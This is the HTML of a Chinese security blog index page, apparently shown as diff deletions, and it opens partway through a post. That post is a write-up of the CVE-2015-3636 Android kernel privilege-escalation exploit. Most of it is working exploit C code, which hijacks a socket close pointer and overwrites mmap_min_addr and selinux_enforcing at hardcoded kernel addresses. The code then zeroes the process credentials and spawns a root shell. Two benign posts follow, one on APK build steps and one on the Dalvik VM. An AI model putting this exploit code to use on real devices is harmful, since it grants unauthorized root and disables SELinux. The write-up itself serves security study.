class="keyword">if</span> (ts.tv_sec == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> -ENOENT;</span><br><span class="line">    <span class="keyword">if</span> (ts.tv_sec == <span class="number">0</span>) &#123;</span><br><span class="line">        sk-&gt;sk_stamp = ktime_get_real();</span><br><span class="line">        ts = ktime_to_timespec(sk-&gt;sk_stamp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> copy_to_user(userstamp, &amp;ts, <span class="keyword">sizeof</span>(ts)) ? -EFAULT : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(sock_get_timestampns);</span><br><span class="line"><span class="comment">//这个函数会返回sk-&gt;sk_stamp，在我们的环境中它在sock对象中的偏移正是0x1D8</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2018/08/14/CVE-2015-3636/12.png" alt="12"></p>
-<p>找到exp_sock之后因为它已经完全在我们的控制之中了，所以函数指针也是可控的，对其调用close函数就可以控制PC了。</p>
-<p>可以看到close是在inet_close中调用的。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inet_release</span><span class="params">(struct socket *sock)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> = <span class="title">sock</span>-&gt;<span class="title">sk</span>;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (sk) &#123;</span><br><span class="line">        <span class="keyword">long</span> timeout;</span><br><span class="line"> </span><br><span class="line">        sock_rps_reset_flow(sk);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* Applications forget to leave groups before exiting */</span></span><br><span class="line">        ip_mc_drop_socket(sk);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* If linger is set, we don't return until the close</span></span><br><span class="line"><span class="comment">         * is complete.  Otherwise we return immediately. The</span></span><br><span class="line"><span class="comment">         * actually closing is done the same either way.</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * If the close is due to the process exiting, we never</span></span><br><span class="line"><span class="comment">         * linger..</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        timeout = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (sock_flag(sk, SOCK_LINGER) &amp;&amp;</span><br><span class="line">            !(current-&gt;flags &amp; PF_EXITING))</span><br><span class="line">            timeout = sk-&gt;sk_lingertime;</span><br><span class="line">        sock-&gt;sk = <span class="literal">NULL</span>;</span><br><span class="line">        sk-&gt;sk_prot-&gt;close(sk, timeout);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(inet_release);</span><br></pre></td></tr></table></figure>
-<p><img src="/2018/08/14/CVE-2015-3636/13.png" alt="13"></p>
-<p>找一下发现偏移是0x28，所以我们将<code>payload+0x28</code>设置为payload的地址，将payload开头设置为<code>0xFFFFFFC00035D788</code>让它跳到<code>kernel_setsockopt</code></p>
-<p><img src="/2018/08/14/CVE-2015-3636/14.png" alt="14"></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span> *)payload + <span class="number">0x28</span>)  = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)payload;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span> *)payload)         = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0xFFFFFFC00035D788</span>;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span> *)payload + <span class="number">0x68</span>)  = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0xFFFFFFC00035D7C0</span>;</span><br><span class="line">close(exp_sock);</span><br></pre></td></tr></table></figure>
-<p>addr_limit规定了特定线程的用户空间地址最大值，超过这个值的地址用户空间代码不能访问。</p>
-<p>所以把addr_limit改成0xffffffff就可以对内核为所欲为了</p>
-<p>现在我们已经来到了kernel_setsockopt，应该怎么改addr_limit呢？</p>
-<p>当内核需要去使用系统调用的时候就要去掉地址空间的限制，一般的流程是：</p>
-<ul>
-<li>(1)oldfs=get_fs()</li>
-<li>(2)set_fs(KERNEL_DS)</li>
-<li>(3)set_fs(oldfs)</li>
-</ul>
-<p>如果能绕过set_fs(oldfs)的执行，内核空间将一直对用户态打开，这样就绕过了限制。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kernel_setsockopt</span><span class="params">(struct socket *sock, <span class="keyword">int</span> level, <span class="keyword">int</span> optname,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">char</span> *optval, <span class="keyword">unsigned</span> <span class="keyword">int</span> optlen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">mm_segment_t</span> oldfs = get_fs();</span><br><span class="line">    <span class="keyword">char</span> __user *uoptval;</span><br><span class="line">    <span class="keyword">int</span> err;</span><br><span class="line"> </span><br><span class="line">    uoptval = (<span class="keyword">char</span> __user __force *) optval;</span><br><span class="line"> </span><br><span class="line">    set_fs(KERNEL_DS);</span><br><span class="line">    <span class="keyword">if</span> (level == SOL_SOCKET)</span><br><span class="line">        err = sock_setsockopt(sock, level, optname, uoptval, optlen);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        err = sock-&gt;ops-&gt;setsockopt(sock, level, optname, uoptval,</span><br><span class="line">                        optlen);</span><br><span class="line">    set_fs(oldfs);</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(kernel_setsockopt);</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_fs(x)  (current_thread_info()-&gt;addr_limit = (x))</span></span><br></pre></td></tr></table></figure>
-<p>注意这里因为我们控制了X0所以<code>BLR  X5</code>跳过了<code>STR  X20, [X19,#8]</code>。</p>
-<p><img src="/2018/08/14/CVE-2015-3636/15.png" alt="15"></p>
-<p><img src="/2018/08/14/CVE-2015-3636/16.png" alt="16"></p>
-<p>截一张mosec2016上360冰刃实验室讲的<a href="https://github.com/jianqiangzhao/mosec2016/blob/master/Android%20Root%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF%E6%BC%AB%E8%B0%88%EF%BC%9A%E7%BB%95%E8%BF%87PXN.ppt" target="_blank" rel="noopener">《Android Root利用技术漫谈：绕过PXN》</a>中的一张图帮助理解。</p>
-<p><img src="/2018/08/14/CVE-2015-3636/17.png" alt="17"></p>
-<p>现在可以任意读写内核了,下一步是修改全局mmap_min_addr让我们能够在用户态mmap null地址。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   overwrite the global variable mmap_min_addr to 0, then we can mmap NULL in user-mode </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">data8 = <span class="number">0</span>; </span><br><span class="line">kernel_write8((<span class="keyword">void</span> *)<span class="number">0xffffffc000652148</span>, &amp;data8);</span><br><span class="line">user_mm = mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE| MAP_FIXED |MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(MAP_FAILED == user_mm)</span><br><span class="line">&#123;</span><br><span class="line">   perror(<span class="string">"[*] mmap NULL fail"</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这个地址应该怎么找呢?</p>
-<p>注意到setup_arg_pages中有mmap_min_addr。</p>
-<p><img src="/2018/08/14/CVE-2015-3636/18.png" alt="18"></p>
-<p><img src="/2018/08/14/CVE-2015-3636/19.png" alt="19"></p>
-<p><code>0xFFFFFFC00063EE9F+0x132A9=0xFFFFFFC000652148</code>就是这么来的。</p>
-<p>接下来关掉selinux，方法同上。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   overwirte selinux_enforcing to disable selinux</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">data4 = <span class="number">0</span>;</span><br><span class="line">kernel_write4((<span class="keyword">void</span> *)<span class="number">0xffffffc00065399c</span>, &amp;data4);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] selinux disabled.\n"</span>);</span><br></pre></td></tr></table></figure>
-<p><img src="/2018/08/14/CVE-2015-3636/20.png" alt="20"></p>
-<p><img src="/2018/08/14/CVE-2015-3636/21.png" alt="21"></p>
-<p>在arm64系统上栈的最大深度为16K，所以<code>unsigned long thread_info_addr=sp&amp;0xFFFFFFFFFFFFC000</code></p>
-<p>task结构体的偏移是0x10，我们再次调用close，通过下面这段gadget把task结构体的指针leak到<code>0x0000000000000018</code>(X1是0)。</p>
-<p><img src="/2018/08/14/CVE-2015-3636/22.png" alt="22"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*(unsigned long *)((char *)payload + 0x290) = 0;</span><br><span class="line">*(unsigned long *)((char *)payload + 0x28)  = (unsigned long)payload;</span><br><span class="line">*(unsigned long *)((char *)payload)         = (unsigned long)0xFFFFFFC0004AA518;</span><br><span class="line">close(exp_sock);</span><br></pre></td></tr></table></figure>
-<p>接下来改掉task_struct-&gt;cred，整个提权过程就完成了。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">      overwrite task_struct-&gt;cred to gain root privilege</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   task = <span class="literal">NULL</span>;</span><br><span class="line">   task = (<span class="keyword">void</span> *)*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span> *)user_mm + <span class="number">0x18</span>);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[*] task:%p\n"</span>, task); </span><br><span class="line"> </span><br><span class="line">   cred = <span class="literal">NULL</span>;</span><br><span class="line">   kernel_read8((<span class="keyword">char</span> *)task + <span class="number">0x398</span>, &amp;cred);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[*] cred:%p\n"</span>, cred);</span><br><span class="line"> </span><br><span class="line">   data4 = <span class="number">0</span>;</span><br><span class="line">   kernel_write4((<span class="keyword">char</span> *)cred +  <span class="number">4</span>,  &amp;data4);</span><br><span class="line">   kernel_write4((<span class="keyword">char</span> *)cred +  <span class="number">8</span>,  &amp;data4);</span><br><span class="line">   kernel_write4((<span class="keyword">char</span> *)cred + <span class="number">12</span>,  &amp;data4);</span><br><span class="line">   kernel_write4((<span class="keyword">char</span> *)cred + <span class="number">16</span>,  &amp;data4);</span><br><span class="line">   kernel_write4((<span class="keyword">char</span> *)cred + <span class="number">20</span>,  &amp;data4);</span><br><span class="line">   kernel_write4((<span class="keyword">char</span> *)cred + <span class="number">24</span>,  &amp;data4);</span><br><span class="line">   kernel_write4((<span class="keyword">char</span> *)cred + <span class="number">28</span>,  &amp;data4);</span><br><span class="line">   kernel_write4((<span class="keyword">char</span> *)cred + <span class="number">32</span>,  &amp;data4);</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">      cleanup to avoid crash. overwirte task_struct-&gt;files-&gt;fdt-&gt;max_fds to 0</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"> </span><br><span class="line">   kernel_read8((<span class="keyword">char</span> *)task + <span class="number">0x788</span>, &amp;files);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[*] files:%p\n"</span>, files);</span><br><span class="line"> </span><br><span class="line">   kernel_read8((<span class="keyword">char</span> *)files + <span class="number">8</span>, &amp;fdt);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[*] fdt:%p\n"</span>, fdt);</span><br><span class="line"> </span><br><span class="line">   data4 = <span class="number">0</span>;</span><br><span class="line">   kernel_write4(fdt, &amp;data4);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"[*] congrats, enjoy your root shell.\n"</span>);</span><br><span class="line">      system(<span class="string">"/system/bin/sh"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] Oops, you'd better have a cup of tea and try again:(\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
-<p>文章中另外涉及到的参考知识：</p>
-<p><a href="https://purzle.wordpress.com/2017/07/07/android-interals-part-4/" target="_blank" rel="noopener">Android Interals-Part4</a></p>
-<p><a href="https://www.kernel.org/doc/htmldocs/networking/API-struct-sock.html" target="_blank" rel="noopener">API-struct-sock.html</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/14/CVE-2015-3636/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Android程序的生成步骤" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/08/Android程序的生成步骤/">Android程序的生成步骤</a>
-    </h1>
-  
-
-        
-        <a href="/2018/08/08/Android程序的生成步骤/" class="archive-article-date">
-  	<time datetime="2018-08-08T09:14:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-08</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="Android程序的生成步骤"><a href="#Android程序的生成步骤" class="headerlink" title="Android程序的生成步骤"></a>Android程序的生成步骤</h3><p><img src="/2018/08/08/Android程序的生成步骤/Apk打包.png" alt="Apk打包"></p>
-<ul>
-<li><strong>打包资源文件，生成R.java文件</strong><ul>
-<li>打包资源的工具aapt位于android-sdk\platform-tools目录下，该工具的源码在Android系统源码的frameworks\base\tools\aapt目录下<ul>
-<li>生成的过程主要是调用了aapt源码目录下Resource.cpp文件中的buildResources()函数</li>
-<li>该函数首先检查AndroidManifest.xml的合法性</li>
-<li>然后对res目录下的资源子目录进行处理，处理的函数为makeFileResources()，处理的内容包括资源文件名的合法性检查，向资源表table添加条目等</li>
-</ul>
-</li>
-<li>处理完后调用compileResourceFile()函数编译res与asserts目录下的资源并生成resources.arsc文件<ul>
-<li>compileResourceFile()函数位于aapt源码目录的ResourceTable.cpp文件中</li>
-<li>该函数最后会调用parseAndAddEntry()函数生成R.java文件</li>
-</ul>
-</li>
-<li>完成资源编译后，接下来调用compileXmlFile()函数对res目录的子目录下的xml文件分别进行编译</li>
-<li>将所有的资源与编译生成的resources.arsc文件以及“加密”过的AndroidManifest.xml文件打包压缩成resources.ap_文件<ul>
-<li>使用Ant工具命令行编译则会生成与build.xml中“project name”指定的属性同名的ap_文件</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><strong>处理aidl文件，生成相应的Java文件</strong><ul>
-<li>对于没有使用到aidl的Android工程，这一步可以跳过。</li>
-<li>使用到的工具为aidl，位于android-sdk\platform-tools目录下</li>
-<li>aidl工具解析接口定义文件并生成相应的Java代码供程序调用，源码frameworks\base\tools\aidl目录下<ul>
-<li>aidl为android interface definition language的首字母缩写，即Android接口描述语言</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><strong>编译工程源代码，生成相应的class文件</strong><ul>
-<li>调用javac编译工程src目录下所有的java源文件，生成的class文件位于工程的bin\classes目录</li>
-</ul>
-</li>
-<li><strong>转换所有的class文件，生成classes.dex文件</strong><ul>
-<li>程序运行所需的classes.dex为Dalvik可执行文件</li>
-<li>使用到的工具为dx，它位于android-sdk\platform-tools目录下</li>
-<li>dx工具主要的工作是将Java字节码转换为Dalvik字节码、压缩常量池、消除冗余信息</li>
-</ul>
-</li>
-<li><strong>打包生成APK文件</strong><ul>
-<li>打包的工具为apkbuilder，它位于android-sdk\tools目录下</li>
-<li>apkbuilder为一个脚本文件，实际调用的是android-sdk\tools\lib\sdklib.jar文件中的com.android.sdklib.build.ApkBuilderMain类。</li>
-<li>实现代码位于Android系统源码的sdk\sdkmanager\libs\sdklib\src\com\android\sdklib\build\ApkBuilderMain.java文件，代码构建了一个ApkBuilder类</li>
-<li>以包含resources.arsc的文件为基础生成apk文件，这个文件一般为ap_结尾的文件</li>
-<li>接着调用addSourceFolder()函数添加工程的资源<ul>
-<li>addSourceFolder()会调用processFileForResource()函数往apk文件中添加资源</li>
-<li>处理的内容包括res目录与assets目录中的文件</li>
-</ul>
-</li>
-<li>添加完资源后调用addResourcesFromJar()函数往apk文件中写入依赖库</li>
-<li>接着调用addNativeLibraries()函数添加工程libs目录下的Native库<ul>
-<li>通过Android NDK编译生成的so或bin文件</li>
-</ul>
-</li>
-<li>最后调用sealApk()关闭apk文件</li>
-</ul>
-</li>
-<li><strong>对APK文件进行签名</strong><ul>
-<li>签名APK有两种情况：<ul>
-<li>一种是在调试程序时进行签名，使用Eclipse开发Android程序时，在编译调试程序时会自己使用一个debug.keystore对apk进行签名</li>
-<li>一种是打包发布时对程序进行签名，这种情况下需要提供了一个符合Android开发文档中要求的签名文件。</li>
-</ul>
-</li>
-<li>签名的方法有两种情况：<ul>
-<li>一种是使用JDK中提供的jarsigner工具签名</li>
-<li>一种是使用Android源码中提供的signapk工具，它的代码位于Android系统源码的build\tools\signapk目录下。</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><strong>对签名后的APK文件进行对齐处理</strong><ul>
-<li>使用到的工具为zipalign<ul>
-<li>位于android-sdk\tools目录，源码位于Android系统源码的build\tools\zipalign目录</li>
-<li>主要工作是将apk包进行对齐处理，使apk包中的所有资源文件距离文件起始偏移为4字节整数倍</li>
-<li>通过内存映射访问apk文件时的速度会更快</li>
-</ul>
-</li>
-<li>验证apk文件是否对齐过的工作由ZipAlign.cpp文件的verify()函数完成</li>
-<li>处理对齐的工作则由process()函数完成。</li>
-</ul>
-</li>
-</ul>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/08/Android程序的生成步骤/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Dalvik" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/08/Dalvik/">Dalvik</a>
-    </h1>
-  
-
-        
-        <a href="/2018/08/08/Dalvik/" class="archive-article-date">
-  	<time datetime="2018-08-08T07:47:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-08</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="Dalvik虚拟机概述"><a href="#Dalvik虚拟机概述" class="headerlink" title="Dalvik虚拟机概述"></a>Dalvik虚拟机概述</h3><ul>
-<li>体积小，占用内存空间小</li>
-<li>专有的DEX可执行文件格式，体积更小，执行速度更快</li>
-<li>常量池采用32位索引值，寻址类方法名，字段名，常量更快</li>
-<li>基于寄存器架构，并拥有一套完整的指令系统</li>
-<li>提供了对象生命周期管理，堆栈管理，线程管理，安全和异常管理以及垃圾回收等重要功能</li>
-<li>所有的Android程序都运行在Android系统进程里，每个进程对应着一个Dalvik虚拟机实例</li>
-</ul>
-<h3 id="Dalvik虚拟机与Java虚拟机的区别"><a href="#Dalvik虚拟机与Java虚拟机的区别" class="headerlink" title="Dalvik虚拟机与Java虚拟机的区别"></a>Dalvik虚拟机与Java虚拟机的区别</h3><ul>
-<li>Java虚拟机运行的是Java字节码，Dalvik虚拟机运行的是Dalvik字节码<ul>
-<li>java程序经过编译，生成java字节码保存在class文件中，java虚拟机通过解码class文件中的内容来运行程序。</li>
-<li>Dalvik虚拟机运行的是Dalvik字节码（Dalvik字节码由java字节码转换而来），并被打包到一个DEX（Dalvik Executable）可执行文件中，Dalvik虚拟机通过解码DEX文件来执行字节码。</li>
-</ul>
-</li>
-<li>Dalvik可执行文件体积更小<ul>
-<li>Android sdk中dx工具，负责将Java字节码转为Dalvik字节码。dx工具对Java类文件重新排列，消除在类文件中出现的所有冗余信息，避免虚拟机在初始化时出现反复的文件加载与解析过程。</li>
-<li>dx工具将所有的Java类文件中的常量池进行分解，消除其中的冗余信息，重新组合形成一个常量池，所有的类文件共享同一个常量池。</li>
-</ul>
-</li>
-<li>Java虚拟机与Dalvik虚拟机架构不同<ul>
-<li>Java虚拟机基于栈架构，程序在运行时虚拟机需要频繁的从栈上读取或写入数据，这个过程需要更多的指令分派与内存访问次数，会耗费不少CPU时间。</li>
-<li>Dalvik虚拟机基于寄存器架构，数据的访问通过寄存器间直接传递，比基于栈方式要快很多。</li>
-<li>对于Java程序来说，每个线程在执行时都有一个PC计数器与一个Java栈，PC计数器以字节为单位记录当前运行位置距离方法开头的偏移量，作用类似于ARM架构CPU的PC寄存器与x86架构CPU的IP寄存器。</li>
-<li>Java栈以帧（frame）为单位保存线程的运行状态，每调用一个方法就会分配一个新的栈帧压入Java栈上，每从一个方法返回则弹出并撤销相应的帧栈。每个帧栈包括局部变量区，求值栈（JVM规范中将其称为操作数栈）和其他一些信息。</li>
-<li>Dalvik虚拟机运行时同样为每一个线程维护一个PC计数器与调用栈，这个调用栈维护一份寄存器列表，寄存器的数量在方法结构体的register字段中给出，Dalvik虚拟机会根据这个值来创建一份虚拟的寄存器列表。</li>
-</ul>
-</li>
-</ul>
-<h3 id="Dalvik虚拟机执行程序"><a href="#Dalvik虚拟机执行程序" class="headerlink" title="Dalvik虚拟机执行程序"></a>Dalvik虚拟机执行程序</h3><p><img src="/2018/08/08/Dalvik/1.jpeg" alt="1"></p>
-<ul>
-<li><p>Android系统启动加载完内核后，执行顺序：</p>
-<ul>
-<li>init进程<ul>
-<li>设备初始化</li>
-<li>读取init.rc文件并启动系统中重要外部程序Zygote。（Zygote孵化器进程）</li>
-<li>启动Zygote</li>
-<li>Zygote初始化Dalvik虚拟机</li>
-<li>启动system_server并进入Zygote模式，通过socket等候命令</li>
-</ul>
-</li>
-<li>当执行一个Android应用程序时，system_server进程通过Binder IPC方式发送命名给Zygote，Zygote收到命令后通过fork自身创建一个Dalvik虚拟机来执行应用程序的入口函数。</li>
-</ul>
-</li>
-<li><p>Zygote三种创建进程的方法</p>
-<ul>
-<li><p>fork（），创建一个Zygote进程（这种方式实际不会被调用）</p>
-</li>
-<li><p>forkAndSpecialize（），创建一个非Zygote进程</p>
-</li>
-<li><p>forkSystemServer（），创建一个系统服务进程</p>
-</li>
-<li><p>其中Zygote进程可以再fork（）出其他进程，非Zygote进程则不能fork（）其他进程，而系统服务进程在终止后它的子进程也必须终止</p>
-</li>
-</ul>
-</li>
-<li><p>Dalvik虚拟机执行程序流程</p>
-<ul>
-<li><p>1.虚拟机线程Zygote</p>
-</li>
-<li><p>2.loadClassFromDex（）函数完成类的装载工作，（每个类被解析后都会拥有一个ClassObject类型的数据结构存储在运行时环境中）</p>
-</li>
-<li><p>3.gDvm.loadedClasses全局哈希表来存储查询所有装载进来的类</p>
-</li>
-<li><p>4.字节码验证器使用dvmVerifyCodeFlow（）函数对装入的代码进行校验</p>
-</li>
-<li><p>5.虚拟机调用FindClass（）函数查找并装载main方法类</p>
-</li>
-<li><p>6.调用dvmInterpret（）函数初始化解释器并执行字节码流</p>
-</li>
-</ul>
-</li>
-</ul>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/08/Dalvik/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/5/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/7/">Next &raquo;</a>
